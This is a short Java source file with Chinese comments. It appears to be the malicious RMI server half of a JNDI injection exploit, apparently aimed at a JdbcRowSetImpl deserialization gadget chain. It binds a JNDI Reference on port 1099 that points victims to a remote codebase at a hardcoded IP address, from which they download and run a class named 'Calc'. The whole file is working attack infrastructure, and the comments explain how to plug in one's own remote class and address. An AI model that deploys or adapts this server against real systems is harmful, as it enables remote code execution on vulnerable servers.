package jdbcrowsetimpl;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        // Reference需要传入三个参数 (className,factory,factoryLocation)
        // 第一个参数随意填写即可，第二个参数填写我们http服务下的类名，第三个参数填写我们的远程地址
        Reference refObj = new Reference("whatever", "Calc", "http://47.95.7.37:9870/");
        // ReferenceWrapper包裹Reference类，使其能够通过 RMI 进行远程访问
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        registry.bind("refObj", refObjWrapper);
    }
}